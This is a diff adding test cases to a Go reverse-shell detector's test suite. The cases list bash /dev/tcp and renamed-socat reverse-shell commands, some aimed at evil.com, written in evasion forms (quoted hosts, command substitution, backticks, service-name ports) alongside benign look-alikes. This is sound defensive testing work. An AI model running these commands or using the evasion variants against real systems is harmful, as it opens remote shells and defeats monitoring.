@@ -126,6 +126,24 @@ func TestDetectReverseShells(t *testing.T) {
 		// ...while the real forms of those patterns still fire.
 		// Bypasses found in review of the redirect-position rule: bash connects
 		// through quotes, variables, >| and escapes; a 127.* prefix is not loopback.
+		// Bypasses of the endpoint-regex version (#857 review): bash connects
+		// with any of these, so only bare mentions and literal loopback
+		// endpoints may be ignored.
+		{name: "host from command substitution", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/$(echo 1.2.3.4)/4444; sh <&3 >&3`}}, wantCount: 1},
+		{name: "quoted host", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/"1.2.3.4"/4444`}}, wantCount: 1},
+		{name: "quoted port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/1.2.3.4/"4444"`}}, wantCount: 1},
+		{name: "port from backticks", processes: []Process{{PID: 1, User: "1000", Command: "bash -c exec 3<>/dev/tcp/1.2.3.4/`echo 4444`"}}, wantCount: 1},
+		{name: "empty-quote concatenation", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/1.2.3.4''/4444`}}, wantCount: 1},
+		{name: "service-name port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/evil.com/https`}}, wantCount: 1},
+		{name: "loopback host but variable port is not a literal probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/localhost/$P`}}, wantCount: 1},
+		{name: "loopback shorthand 127.1 probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/127.1/8080`}}, wantCount: 0},
+		{name: "quoted loopback probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/"localhost"/5432`}}, wantCount: 0},
+		{name: "grep for /dev/tcp/ in single quotes", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn '/dev/tcp/' docs`}}, wantCount: 0},
+		// socat net-address rule must not fire on look-alike words.
+		{name: "k8s manifest with exec and tcpSocket probes", processes: []Process{{PID: 1, User: "1000", Command: "bash -c cat > k8s.yaml <<EOF livenessProbe:\n  exec:\n    command: [x]\n readinessProbe:\n  tcpSocket:\n    port: 8080\nEOF"}}, wantCount: 0},
+		{name: "rg for tcp: or exec:", processes: []Process{{PID: 1, User: "1000", Command: `rg -n "tcp:|exec:" src/`}}, wantCount: 0},
+		{name: "renamed socat with IPv6 address", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp6:[2001:db8::1]:443 exec:sh`}}, wantCount: 1},
+		{name: "renamed socat listener", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp-listen:4444,reuseaddr exec:sh`}}, wantCount: 1},
 		{name: "double-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>"/dev/tcp/10.0.0.1/4444"; cat <&3 | sh >&3 2>&3`}}, wantCount: 1},
 		{name: "single-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>'/dev/tcp/10.0.0.1/4444'; sh <&3 >&3`}}, wantCount: 1},
 		{name: "/dev/tcp path in a variable", processes: []Process{{PID: 1, User: "1000", Command: `bash -c d=/dev/tcp/10.0.0.1/4444; exec 3<>$d; sh <&3 >&3 2>&3`}}, wantCount: 1},
